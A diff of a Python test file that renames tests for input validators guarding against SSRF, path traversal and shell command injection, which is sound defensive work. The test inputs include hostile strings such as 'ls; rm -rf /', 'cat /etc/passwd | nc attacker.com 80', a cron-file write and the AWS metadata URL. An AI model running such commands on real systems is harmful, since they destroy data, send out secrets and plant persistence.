@@ -38,52 +38,52 @@ class TestSafeUrl:
             m = UrlModel(url="https://example.com")
             assert m.url == "https://example.com"
 
-    def test_security_types_loopback_url_raises_validation_error(self) -> None:
+    def test_security_types_loopback_url_raises_validation_error_standard_expected(self) -> None:
         """A URL resolving to a loopback address raises ValidationError (SSRF)."""
         with pytest.raises(ValidationError) as exc_info:
             UrlModel(url="http://127.0.0.1/admin")
         errors = exc_info.value.errors()
         assert len(errors) >= 1
 
-    def test_security_types_private_ip_url_raises_validation_error(
+    def test_security_types_private_ip_url_raises_validation_error_standard_expected(
         self,
     ) -> None:
         """A URL pointing to a private IP raises ValidationError (SSRF)."""
         with pytest.raises(ValidationError):
             UrlModel(url="http://192.168.1.1/secret")
 
-    def test_security_types_metadata_endpoint_raises_validation_error(
+    def test_security_types_metadata_endpoint_raises_validation_error_standard_expected(
         self,
     ) -> None:
         """AWS metadata endpoint raises ValidationError (SSRF)."""
         with pytest.raises(ValidationError):
             UrlModel(url="http://169.254.169.254/latest/meta-data/")
 
-    def test_security_types_invalid_scheme_raises_validation_error(
+    def test_security_types_invalid_scheme_raises_validation_error_standard_expected(
         self,
     ) -> None:
         """A non-http/https scheme raises ValidationError."""
         with pytest.raises(ValidationError):
             UrlModel(url="ftp://example.com/file.txt")
 
-    def test_security_types_empty_string_raises_validation_error(self) -> None:
+    def test_security_types_empty_string_raises_validation_error_standard_expected(self) -> None:
         """An empty URL raises ValidationError."""
         with pytest.raises(ValidationError):
             UrlModel(url="")
 
-    def test_security_types_no_domain_raises_validation_error(self) -> None:
+    def test_security_types_no_domain_raises_validation_error_standard_expected(self) -> None:
         """URL without domain raises ValidationError."""
         with pytest.raises(ValidationError):
             UrlModel(url="https://")
 
-    def test_security_types_link_local_address_raises_validation_error(
+    def test_security_types_link_local_address_raises_validation_error_standard_expected(
         self,
     ) -> None:
         """Link-local IP address raises ValidationError (SSRF)."""
         with pytest.raises(ValidationError):
             UrlModel(url="http://169.254.0.1/data")
 
-    def test_security_types_safe_url_returns_guarded_value(self) -> None:
+    def test_security_types_safe_url_returns_guarded_value_standard_expected(self) -> None:
         """The SSRF validator returns the Ok value from the guard."""
         with patch(
             "taipanstack.security.types.guard_ssrf",
@@ -114,19 +114,19 @@ class TestSafePath:
         m = PathModel(path="uploads/image.png")
         assert m.path == "uploads/image.png"
 
-    def test_security_types_path_traversal_dotdot_raises(self) -> None:
+    def test_security_types_path_traversal_dotdot_raises_standard_expected(self) -> None:
         """Path containing '..' raises ValidationError."""
         with pytest.raises(ValidationError) as exc_info:
             PathModel(path="../etc/passwd")
         errors = exc_info.value.errors()
         assert len(errors) >= 1
 
-    def test_security_types_encoded_traversal_raises(self) -> None:
+    def test_security_types_encoded_traversal_raises_standard_expected(self) -> None:
         """URL-encoded path traversal raises ValidationError."""
         with pytest.raises(ValidationError):
             PathModel(path="%2e%2e/etc/shadow")
 
-    def test_security_types_tilde_traversal_raises(self) -> None:
+    def test_security_types_tilde_traversal_raises_standard_expected(self) -> None:
         """Tilde in path raises ValidationError."""
         with pytest.raises(ValidationError):
             PathModel(path="~/secrets")
@@ -159,34 +159,34 @@ class TestSafeCommand:
         m = CommandModel(command="ls")
         assert m.command == "ls"
 
-    def test_security_types_command_with_semicolon_raises(self) -> None:
+    def test_security_types_command_with_semicolon_raises_standard_expected(self) -> None:
         """Command containing semicolon raises ValidationError."""
         with pytest.raises(ValidationError) as exc_info:
             CommandModel(command="ls; rm -rf /")
         errors = exc_info.value.errors()
         assert len(errors) >= 1
 
-    def test_security_types_command_with_pipe_raises(self) -> None:
+    def test_security_types_command_with_pipe_raises_standard_expected(self) -> None:
         """Command containing pipe raises ValidationError."""
         with pytest.raises(ValidationError):
             CommandModel(command="cat /etc/passwd | nc attacker.com 80")
 
-    def test_security_types_command_with_dollar_raises(self) -> None:
+    def test_security_types_command_with_dollar_raises_standard_expected(self) -> None:
         """Command containing variable expansion raises ValidationError."""
         with pytest.raises(ValidationError):
             CommandModel(command="echo $SECRET")
 
-    def test_security_types_command_with_backtick_raises(self) -> None:
+    def test_security_types_command_with_backtick_raises_standard_expected(self) -> None:
         """Command containing backtick substitution raises ValidationError."""
         with pytest.raises(ValidationError):
             CommandModel(command="echo `id`")
 
-    def test_security_types_command_with_ampersand_raises(self) -> None:
+    def test_security_types_command_with_ampersand_raises_standard_expected(self) -> None:
         """Command containing ampersand raises ValidationError."""
         with pytest.raises(ValidationError):
             CommandModel(command="sleep 100 & disown")
 
-    def test_security_types_command_with_redirect_raises(self) -> None:
+    def test_security_types_command_with_redirect_raises_standard_expected(self) -> None:
         """Command containing output redirect raises ValidationError."""
         with pytest.raises(ValidationError):
             CommandModel(command="echo hacked > /etc/cron.d/pwn")
@@ -216,29 +216,29 @@ class TestSafeProjectName:
         m = ProjectModel(name="my-project")
         assert m.name == "my-project"
 
-    def test_security_types_empty_name_raises(self) -> None:
+    def test_security_types_empty_name_raises_standard_expected(self) -> None:
         """Empty project name raises ValidationError."""
         with pytest.raises(ValidationError) as exc_info:
             ProjectModel(name="")
         errors = exc_info.value.errors()
         assert len(errors) >= 1
 
-    def test_security_types_name_starting_with_digit_raises(self) -> None:
+    def test_security_types_name_starting_with_digit_raises_standard_expected(self) -> None:
         """Project name starting with a digit raises ValidationError."""
         with pytest.raises(ValidationError):
             ProjectModel(name="123project")
 
-    def test_security_types_reserved_name_raises(self) -> None:
+    def test_security_types_reserved_name_raises_standard_expected(self) -> None:
         """Reserved project name raises ValidationError."""
         with pytest.raises(ValidationError):
             ProjectModel(name="test")
 
-    def test_security_types_name_with_spaces_raises(self) -> None:
+    def test_security_types_name_with_spaces_raises_standard_expected(self) -> None:
         """Project name containing spaces raises ValidationError."""
         with pytest.raises(ValidationError):
             ProjectModel(name="my project")
 
-    def test_security_types_name_too_long_raises(self) -> None:
+    def test_security_types_name_too_long_raises_standard_expected(self) -> None:
         """Project name exceeding max length raises ValidationError."""
         with pytest.raises(ValidationError):
             ProjectModel(name="a" * 101)
@@ -249,7 +249,7 @@ class TestSafeProjectName:
 # ---------------------------------------------------------------------------
 
 
-def test_security_types_safe_url_err_branch() -> None:
+def test_security_types_safe_url_err_branch_standard_expected() -> None:
     import pytest
     from pydantic import BaseModel, ValidationError
 
